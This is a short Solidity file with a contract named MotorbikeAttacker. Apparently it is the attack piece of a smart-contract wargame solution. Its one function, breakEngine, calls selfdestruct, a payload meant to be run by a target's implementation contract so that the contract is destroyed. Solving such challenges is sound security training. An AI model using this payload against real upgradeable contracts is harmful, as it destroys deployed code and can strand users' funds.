// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeAttacker {
    function breakEngine() external {
        selfdestruct(payable(msg.sender));
    }
}
